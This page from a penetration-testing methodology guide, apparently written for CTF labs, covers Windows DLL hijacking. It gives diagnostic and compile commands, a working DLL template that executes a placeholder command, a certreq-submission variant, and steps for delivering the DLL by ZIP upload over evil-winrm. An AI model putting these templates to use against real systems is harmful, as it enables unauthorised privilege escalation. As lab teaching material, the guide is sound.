---
title: "09 · DLL Hijacking"
---

# 09 · DLL Hijacking

> When a service loads a missing/writable DLL, you control the code path.

!!! note "Phase overview"
    Every Windows process resolves DLLs through a search order and some services look for DLLs that don't exist, or in directories that low-priv users can write to. Plant a DLL with the right name and exported function, and the next time the service runs, your code runs in its security context. Two cardinal sins to avoid: wrong architecture (Error 193 : see the Logging HTB note in Gotchas) and blocking calls (a hung DLL never returns, freezes the service, requires box reset).

### 9.1 · Finding DLL Hijack Opportunities

!!! info "Why this works / how it chains"

    Error codes are your map. 126 means the DLL doesn't exist (or a dependency is missing) most exploitable. 193 means architecture mismatch (32 vs 64-bit). Use file on the target binary to determine architecture before compiling. Decompiling .NET binaries with monodis or ilspycmd reveals the exact exported function names the loader expects (you must match them in your DLL).

!!! warning "What leads here"
    - Service or scheduled task loads a DLL that doesn't exist
    - Write access to the DLL directory or to a ZIP delivery mechanism
    - Process log shows 'Failed to load X.dll. Error code: 126/193'
    - Signs: log files, Process Monitor traces, decompiled binary analysis

```bash title="Diagnose error codes + decompile"
# Error codes:
# Error 126 = DLL not found OR dependency missing
# Error 193 = Wrong architecture (64-bit DLL on 32-bit process)

# Some examples:

# Check process architecture
[System.Environment]::Is64BitProcess  # PowerShell on target
file target.exe  # on Kali after download

# Decompile .NET binary to find exported function name
monodis UpdateMonitor.exe > UpdateMonitor.il
# OR
ilspycmd UpdateMonitor.exe > UpdateMonitor.cs
# Look for: GetProcAddress calls, delegate types, function names

# Check delivery method (direct or via ZIP)
# Read the binary/logs to understand the loading mechanism
```


### 9.2 · DLL Compilation

!!! info "Why this works / how it chains"

    Match the architecture or you get Error 193. Use CreateProcess (non-blocking) instead of system() (blocking). DllMain should call DisableThreadLibraryCalls so you don't run on every thread attach. The exported function name MUST match what the loader calls; find it via decompilation in 9.1.

```bash title="Compiler choice + arch check"
# CRITICAL: Match target architecture
# Check binary: file target.exe
# PE32 = 32-bit → use i686
# PE32+ = 64-bit → use x86_64

# 32-bit compile
i686-w64-mingw32-gcc -shared -o target.dll source.c -s

# 64-bit compile
x86_64-w64-mingw32-gcc -shared -o target.dll source.c -s

# Verify
file target.dll
# PE32 = 32-bit ✓
# PE32+ = 64-bit ✓
```

```c title="Non-blocking DLL template"
// DLL template - non-blocking, correct export name
#include <windows.h>

// MUST match the exact function name the loader calls
__declspec(dllexport) void PreUpdateCheck(void) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    // Use CreateProcess not system() - non-blocking!
    char cmd[] = "cmd /c YOUR_COMMAND_HERE";
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {
    if (r == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);
    return TRUE;
}
```

```c title="certreq submission template"
// For certreq submission (no blocking, no prompts):
__declspec(dllexport) void PreUpdateCheck(void) {
    WinExec("cmd /c certreq -f -submit "
            "-attrib \"CertificateTemplate:Name\" "
            "-config \"DC01\\CA-Name\" "
            "C:\\path\\req.csr "
            "C:\\path\\cert.cer "
            "> C:\\path\\log.txt 2>&1 < NUL", 0);
    // -f = force, < NUL = no interactive prompts (CRITICAL!)
}
```


### 9.3 · ZIP Delivery

!!! info "Why this works / how it chains"

    Some services unpack a ZIP and then load a DLL from inside it. You write the DLL into the ZIP at the expected path, upload the ZIP, and wait for the service to extract+load. evil-winrm's upload puts files in your current directory, cd to the target dir BEFORE uploading.

```bash title="ZIP packaging + upload"
# Some services extract ZIP then load DLL
# Deliver DLL inside ZIP to the expected ZIP path

zip -j Settings_Update.zip target.dll

# Upload via evil-winrm (cd to target dir first!)
cd C:\ProgramData\Service\
upload Settings_Update.zip
# Wait for trigger (check logs for timing)
Get-Content 'C:\path\service.log' -Tail 5 -Wait
```

